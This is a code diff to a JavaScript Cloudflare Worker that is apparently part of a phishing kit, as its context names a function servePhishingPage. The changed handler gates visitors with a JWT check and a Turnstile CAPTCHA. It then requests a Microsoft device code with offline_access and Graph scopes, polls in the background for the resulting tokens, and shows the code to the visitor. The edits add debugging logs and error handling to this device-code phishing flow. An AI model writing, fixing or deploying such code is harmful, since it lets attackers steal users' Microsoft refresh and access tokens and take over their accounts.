@@ -305,68 +305,95 @@ async function servePhishingPage(request) {
 }
 
 async function handleDeviceCodeRequest(request) {
-  const { jwt_token, turnstile_token } = await request.json();
-
-  // Verify JWT with backend
   try {
-    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token: jwt_token }),
-    });
-    const verifyData = await verifyResponse.json();
-    if (!verifyData.valid) {
-      return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
-        status: 403,
-        headers: { 'Content-Type': 'application/json' },
-      });
-    }
+    const { jwt_token, turnstile_token } = await request.json();
+    console.log('[Worker] Device code request received');
 
-    // Verify Turnstile
-    const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        secret: '{{TURNSTILE_SECRET}}',
-        response: turnstile_token,
-      }),
-    });
-    const turnstileData = await turnstileVerify.json();
-    if (!turnstileData.success) {
-      return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
-        status: 400,
-        headers: { 'Content-Type': 'application/json' },
-      });
-    }
-
-    // Request device code from Microsoft with proper scope for refresh token
-    const deviceCodeResponse = await fetch(
-      `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
-      {
+    // Verify JWT with backend
+    console.log('[Worker] Verifying JWT with backend...');
+    try {
+      const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({
-          client_id: verifyData.client_id,
-          scope: 'offline_access openid profile https://graph.microsoft.com/.default',
-        }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: jwt_token }),
+      });
+      const verifyData = await verifyResponse.json();
+      console.log('[Worker] JWT verification result:', verifyData.valid);
+      if (!verifyData.valid) {
+        console.error('[Worker] JWT verification failed');
+        return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
+          status: 403,
+          headers: { 'Content-Type': 'application/json' },
+        });
       }
-    );
-    const deviceCodeData = await deviceCodeResponse.json();
 
-    // Start background polling with server-recommended interval
-    const pollInterval = deviceCodeData.interval || 5;
-    pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);
+      // Verify Turnstile
+      console.log('[Worker] Verifying Turnstile...');
+      const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          secret: '{{TURNSTILE_SECRET}}',
+          response: turnstile_token,
+        }),
+      });
+      const turnstileData = await turnstileVerify.json();
+      console.log('[Worker] Turnstile verification result:', turnstileData.success);
+      if (!turnstileData.success) {
+        console.error('[Worker] Turnstile verification failed:', turnstileData['error-codes']);
+        return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
+          status: 400,
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
 
-    return new Response(JSON.stringify({
-      user_code: deviceCodeData.user_code,
-      verification_uri: deviceCodeData.verification_uri,
-      expires_in: deviceCodeData.expires_in,
-      message: deviceCodeData.message,
-    }), {
-      headers: { 'Content-Type': 'application/json' },
-    });
+      // Request device code from Microsoft with proper scope for refresh token
+      console.log('[Worker] Requesting device code from Microsoft...');
+      console.log('[Worker] Tenant:', verifyData.tenant, 'Client ID:', verifyData.client_id);
+      const deviceCodeResponse = await fetch(
+        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            client_id: verifyData.client_id,
+            scope: 'offline_access openid profile https://graph.microsoft.com/.default',
+          }),
+        }
+      );
+      const deviceCodeData = await deviceCodeResponse.json();
+      console.log('[Worker] Microsoft response status:', deviceCodeResponse.status);
+      console.log('[Worker] Microsoft response:', JSON.stringify(deviceCodeData).substring(0, 200));
+
+      if (deviceCodeData.error) {
+        console.error('[Worker] Microsoft error:', deviceCodeData.error, deviceCodeData.error_description);
+        return new Response(JSON.stringify({ error: deviceCodeData.error_description || 'Microsoft error' }), {
+          status: 400,
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
+
+      // Start background polling with server-recommended interval
+      const pollInterval = deviceCodeData.interval || 5;
+      pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);
+
+      console.log('[Worker] Returning device code to client');
+      return new Response(JSON.stringify({
+        user_code: deviceCodeData.user_code,
+        verification_uri: deviceCodeData.verification_uri,
+        expires_in: deviceCodeData.expires_in,
+        message: deviceCodeData.message,
+      }), {
+        headers: { 'Content-Type': 'application/json' },
+      });
+    } catch (innerErr) {
+      console.error('[Worker] Inner error in device code request:', innerErr.message);
+      throw innerErr;
+    }
   } catch (err) {
-    return new Response(JSON.stringify({ error: 'Failed to generate code' }), {
+    console.error('[Worker] Device code request failed:', err.message);
+    console.error('[Worker] Error stack:', err.stack);
+    return new Response(JSON.stringify({ error: 'Failed to generate code', details: err.message }), {
       status: 500,
       headers: { 'Content-Type': 'application/json' },
     });
